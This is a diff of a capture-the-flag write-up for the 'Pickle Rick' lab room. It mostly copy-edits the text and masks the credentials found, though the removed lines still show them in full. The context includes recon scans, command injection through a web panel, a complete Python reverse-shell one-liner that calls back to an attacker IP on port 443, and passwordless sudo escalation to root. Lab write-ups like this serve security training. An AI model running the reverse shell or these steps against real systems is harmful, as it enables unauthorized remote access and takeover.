@@ -46,7 +46,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Rick is sup4r cool
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-Finally let's run an http-enum script on port 80: ```nmap --script http-enum -p80 10.10.123.34 -oN webscan.nmap```
+Finally, let's run an http-enum script on port 80: ```nmap --script http-enum -p80 10.10.123.34 -oN webscan.nmap```
 
 ```bash
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 13:31 -04
@@ -72,7 +72,7 @@ As a good habit, you may want to check the source code of the webpages.
 
 ![Web Page Source Code](/images/THM/PickleRick/21-username.png){: .align-center}
 
-And just like that we get the username ```R1ckRul3s```
+And just like that we get the username ```R1******```
 
 ---
 
@@ -86,7 +86,7 @@ And just like that we get the username ```R1ckRul3s```
 
 ![robots](/images/THM/PickleRick/24-robots-web.png){: .align-center}
 
-In robots.txt we see ```Wubbalubbadubdub```, let's save it in case it's useful later. 
+In robots.txt we see ```Wub********```, let's save it in case it's useful later. 
 
 Just to be sure, now we will launch a gobuster directory scan in case nmap missed something. 
 
@@ -120,9 +120,9 @@ Gobuster will find ```/assets``` directory that does not contain anything intere
 
 ## Gainning access
 
-Moving on to the login page, using the info gathered before, we could try to use ```R1ckRul3s``` as username and ```Wubbalubbadubdub``` as password... and it actually works.
+Moving on to the login page, using the info gathered before, we could try to use ```R1*****``` as username and ```Wub********``` as password... and it actually works.
 
-The next we will see is a Command Panel and an input to execute commands.
+The next we will see is a Command Panel and an input to run commands.
 
 ![Command Panel](/images/THM/PickleRick/26-command-panel.png){: .align-center}
 
@@ -130,13 +130,13 @@ If we try to navigate to another tab, we get the message: *Only the **REAL** ric
 
 ![Denied](/images/THM/PickleRick/33-denied.png){: .align-center}
 
-So, back to the Command Panel, let's assume we could execute system commands and try some.
+Back at the Command Panel, let's assume we can run system commands and try a few.
 
 ![whoami](/images/THM/PickleRick/27-command-whoami.png){: .align-center}
 
 ![ls](/images/THM/PickleRick/30-command-panel-ls.png){: .align-center}
 
-Executing ```cat Sup3rS3cretPickl3Ingred.txt``` the following message will show up. 
+Executing ```cat Sup3rS3cretPickl3Ingred.txt```, the following message will show up. 
 
 ![cat](/images/THM/PickleRick/28-command-cat.png){: .align-center}
 
@@ -156,25 +156,25 @@ Using this [Reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shel
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.0.103",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-Now, we open a listener on port 443 with netcat and execute our command to get the shell.
+Now, we open a listener on port 443 with netcat and run our command to get the shell.
 
 ![Shell](/images/THM/PickleRick/34-first-shell.png){: .align-center}
 
 ## Privilege Escalation
 
-This is the easiest part, the first thing we could do is check the ```www-data``` user privileges with ```sudo -l```. We will find out that we can execute command as root without providing password.
+This is the easiest part, the first thing we could do is check the ```www-data``` user privileges with ```sudo -l```. We will find out that we can execute commands as root without providing password.
 
-So we make ```sudo su``` to become root user.
+Running ```sudo su``` will make us root user.
 
 ![Privesc](/images/THM/PickleRick/37-privesc.png){: .align-center}
 
-The last thing would be locating the other two ingredients. If we check the  ```/home``` path we will see rick directory inside.
+The last thing would be locating the other two ingredients. If we check the  ```/home``` path we will see rick directory inside along with the second ingredient.
 
 ![Second Flag](/images/THM/PickleRick/35-second-ing.png){: .align-center}
 
 **Second Ingredient:** ```1 je*******```
 
-And the last ingredient could be found in the home directory for root or using the find command.
+And the last ingredient could be found in the home directory for root or using ```find```.
 
 ```bash
 find / -type f -name "*.txt" | grep -v "usr"
